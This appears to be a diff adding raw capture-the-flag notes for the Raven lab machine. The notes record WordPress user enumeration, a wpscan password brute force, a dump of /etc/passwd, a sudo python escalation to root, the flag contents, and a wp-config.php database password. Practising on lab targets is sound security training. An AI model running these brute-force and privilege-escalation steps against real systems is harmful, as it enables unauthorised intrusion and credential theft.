@@ -1,1 +1,142 @@
+//for rpc is open
+showmount IP -a (-e -d)
 
+
+[+] steven
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] michael
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+─$ wpscan --url http://raven.local/wordpress --usernames 'steven,michael' --passwords /home/ed/Downloads/rockyou.txt
+[+] Performing password attack on Xmlrpc against 2 user/s
+Trying michael / Lets you update your FunNotes and more! Time: 00:28:50 <> (45500 / 28688784)  0.15%[SUCCESS] - steven / pink84  
+
+
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+Debian-exim:x:104:109::/var/spool/exim4:/bin/false
+messagebus:x:105:110::/var/run/dbus:/bin/false
+statd:x:106:65534::/var/lib/nfs:/bin/false
+sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
+michael:x:1000:1000:michael,,,:/home/michael:/bin/bash
+smmta:x:108:114:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+smmsp:x:109:115:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+mysql:x:110:116:MySQL Server,,,:/nonexistent:/bin/false
+steven:x:1001:1001::/home/steven:/bin/sh
+
+$ sudo -l
+Matching Defaults entries for steven on raven:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User steven may run the following commands on raven:
+    (ALL) NOPASSWD: /usr/bin/python
+$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+sh: 0: Illegal option -p
+$ sudo python -c 'import os; os.system("/bin/sh")'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls
+flag4.txt
+# cat flag4.txt
+______                      
+
+| ___ \                     
+
+| |_/ /__ ___   _____ _ __  
+
+|    // _` \ \ / / _ \ '_ \ 
+
+| |\ \ (_| |\ V /  __/ | | |
+
+\_| \_\__,_| \_/ \___|_| |_|
+
+                            
+flag4{715dea6c055b9fe3337544932f2941ce}
+
+CONGRATULATIONS on successfully rooting Raven!
+
+# find / -name "flag*" 2>/dev/null
+/var/www/flag2.txt
+/root/flag4.txt
+/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html
+/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html
+/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags
+/sys/devices/virtual/net/lo/flags
+/sys/devices/platform/serial8250/tty/ttyS0/flags
+/sys/devices/platform/serial8250/tty/ttyS1/flags
+/sys/devices/platform/serial8250/tty/ttyS2/flags
+/sys/devices/platform/serial8250/tty/ttyS3/flags
+
+# cat /var/www/flag2.txt
+flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
+
+flag3{afc01ab56b50591e7dccf93122770cd2}
+
+
+# cat /var/www/html/wordpress/wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'R@v3nSecurity');
+
+source code of page  http://raven.local/service.html
+flag1{b9bbcb33e11b80be759c4e844862482d} -->
